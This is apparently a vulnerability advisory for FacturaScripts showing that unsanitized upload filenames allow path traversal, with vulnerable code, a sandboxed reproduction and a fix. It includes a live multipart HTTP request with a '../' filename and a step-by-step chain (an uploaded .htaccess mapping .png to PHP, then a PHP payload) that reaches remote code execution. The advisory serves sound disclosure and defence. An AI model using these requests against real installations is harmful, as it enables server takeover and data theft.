## Summary

`FacturaScripts\Core\UploadedFile::move($destiny, $destinyName)` concatenates `$destiny` and `$destinyName` without normalizing the resulting path. Every caller in the codebase passes `UploadedFile::getClientOriginalName()` — the unsanitized client-supplied filename — as `$destinyName`, so an authenticated user submitting a filename containing `../` segments can write the uploaded content to any directory writable by the web-server user, escaping the intended `MyFiles/` location.

Because the shipped `htaccess-sample` (the documented production Apache configuration) excludes `Dinamic/Assets/` and `node_modules/` from the `index.php` rewrite, files written into those directories are served directly by Apache. Combined with `.htaccess` not being in `BLOCKED_EXTENSIONS`, the primitive escalates from arbitrary file write to remote code execution.

## Vulnerable Code

`Core/UploadedFile.php`:

```php
private const BLOCKED_EXTENSIONS = ['phar', 'php', 'php3', 'php4', 'php5', 'php7', 'php8', 'pht', 'phtml', 'phps'];

public function move(string $destiny, string $destinyName): bool
{
    if (!$this->isValid()) {
        return false;
    }
    if (substr($destiny, -1) !== DIRECTORY_SEPARATOR) {
        $destiny .= DIRECTORY_SEPARATOR;
    }
    return $this->test ?
        rename($this->tmp_name, $destiny . $destinyName) :
        move_uploaded_file($this->tmp_name, $destiny . $destinyName);
}

public function getClientOriginalName(): string
{
    return $this->name ?? '';
}
```

`isValid()` only checks the extension blocklist, the upload error code, and `is_uploaded_file()` — it never inspects the filename for directory separators or `..` segments.

Six call sites pass the raw client filename straight into `move()`:

- `Core/Controller/ApiUploadFiles.php:58` — `POST /api/3/uploadfiles`
- `Core/Controller/ApiAttachedFiles.php:136` — `POST /api/3/attachedfiles`
- `Core/Lib/Widget/WidgetFile.php:84` — every form using a file widget
- `Core/Lib/Widget/WidgetLibrary.php:215` — library widget upload
- `Core/Lib/ExtendedController/DocFilesTrait.php:51` — document files trait
- `Core/Controller/AdminPlugins.php:260` — plugin (zip) upload

Representative sink — `Core/Controller/ApiUploadFiles.php:56-79`:

```php
private function uploadFile(UploadedFile $uploadFile): ?AttachedFile
{
    if (false === $uploadFile->isValid()) {
        return null;
    }
    $destiny = FS_FOLDER . '/MyFiles/';
    $destinyName = $uploadFile->getClientOriginalName();
    if (file_exists($destiny . $destinyName)) {
        $destinyName = mt_rand(1, 999999) . '_' . $destinyName;
    }
    if ($uploadFile->move($destiny, $destinyName)) {
        ...
    }
}
```

Shipped `htaccess-sample` (production Apache rules):

```apache
<IfModule mod_rewrite.c>
   RewriteEngine On
   RewriteBase /
   RewriteCond %{REQUEST_URI} !Dinamic/Assets/ [NC]
   RewriteCond %{REQUEST_URI} !node_modules/ [NC]
   RewriteRule . index.php [L]
</IfModule>
```

Apache therefore serves any file under `Dinamic/Assets/` directly, bypassing `index.php` entirely.

## PoC

### Step 1 — Static reproduction of the file-write primitive

The following script replicates `UploadedFile::move()`'s `rename()` path verbatim inside a sandboxed temp directory. It does not run any payload — it only demonstrates that the destination escapes `MyFiles/` when the filename contains `../`.

```php
<?php
$base = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'fs_verify_' . uniqid();
mkdir($base);
mkdir($base . '/MyFiles');
mkdir($base . '/Dinamic');
mkdir($base . '/Dinamic/Assets');

$tmp = $base . '/tmp_upload.dat';
file_put_contents($tmp, "static-verification-marker\n");

function fs_move($tmp_name, $destiny, $destinyName) {
    if (substr($destiny, -1) !== DIRECTORY_SEPARATOR) {
        $destiny .= DIRECTORY_SEPARATOR;
    }
    return rename($tmp_name, $destiny . $destinyName);
}

fs_move($tmp, $base . '/MyFiles', '../Dinamic/Assets/traversed.txt');

echo file_exists($base . '/Dinamic/Assets/traversed.txt')
    ? "WRITTEN OUTSIDE MyFiles\n"
    : "blocked\n";
```

Output:

```
WRITTEN OUTSIDE MyFiles
```

### Step 2 — Equivalent live HTTP request

```http
POST /api/3/uploadfiles HTTP/1.1
Host: target
Token: <valid-api-token>
Content-Type: multipart/form-data; boundary=---X

-----X
Content-Disposition: form-data; name="files[]"; filename="../Dinamic/Assets/traversed.txt"
Content-Type: text/plain

static-verification-marker
-----X--
```

After the request, `Dinamic/Assets/traversed.txt` exists on disk and is reachable at `https://target/Dinamic/Assets/traversed.txt` — Apache serves it directly because the path is excluded from the `index.php` rewrite.

### Step 3 — Chain to code execution

Because `.htaccess` is not in `BLOCKED_EXTENSIONS`, the same primitive can write an Apache override into `Dinamic/Assets/`:

1. Upload with filename `../Dinamic/Assets/.htaccess` and body `AddType application/x-httpd-php .png`
2. Upload with filename `../Dinamic/Assets/x.png` containing a PHP payload (extension `png` is not blocked, content is not validated by `isValid()`)
3. Request `https://target/Dinamic/Assets/x.png` — Apache hands it to the PHP handler per the uploaded `.htaccess`

## Root Cause

`UploadedFile::move()` performs raw `$destiny . $destinyName` concatenation and trusts `getClientOriginalName()`, which returns `$this->name ?? ''` with no normalization. No call site applies `basename()` or any equivalent before passing the client filename to `move()`. The blocklist in `BLOCKED_EXTENSIONS` covers only PHP-family extensions and does not cover `htaccess`, which is required for the rewrite-excluded directory to be useful for code execution.

## Impact

Authenticated attacker (any role with permission to call one of the six upload entry points — including any user allowed to attach a file to a record, or any API token with `uploadfiles`/`attachedfiles` access) can:

- Write arbitrary content to any path under the application root that is writable by the web-server user, including `Dinamic/Assets/` (Apache-direct-served) and `node_modules/`.
- Overwrite shipped JS/CSS inside `Dinamic/Assets/`, injecting client-side script that executes in every administrator's browser → session takeover on next admin page load.
- Drop a `.htaccess` into `Dinamic/Assets/` remapping a benign extension to the PHP handler, followed by a second upload that lands an executable payload — full remote code execution as the web-server user.

The required precondition is only an authenticated session or API token with upload privileges, which is granted to a wide range of non-administrative roles in standard installations.

## Fix

Minimal fix — sanitize inside `UploadedFile::move()` so every call site is covered automatically:

```php
public function move(string $destiny, string $destinyName): bool
{
    if (!$this->isValid()) {
        return false;
    }
    // strip any directory component from the client-supplied filename
    $destinyName = basename($destinyName);
    if (substr($destiny, -1) !== DIRECTORY_SEPARATOR) {
        $destiny .= DIRECTORY_SEPARATOR;
    }
    return $this->test ?
        rename($this->tmp_name, $destiny . $destinyName) :
        move_uploaded_file($this->tmp_name, $destiny . $destinyName);
}
```

Apply the same change in `moveTo()`.

Recommended hardening in addition:

- Add `htaccess`, `htm`, `html`, `shtml`, `phtm` to `BLOCKED_EXTENSIONS`, or replace the blocklist with an allowlist resolved per call site.
- After concatenating the final destination, verify with `realpath()` that the result is still inside the intended base directory; abort otherwise.
- Drop a `Deny from all` `.htaccess` (or equivalent web-server rule) into `MyFiles/` so even successfully written files cannot be requested directly without going through the application download endpoint (which already enforces `MyFilesToken`).
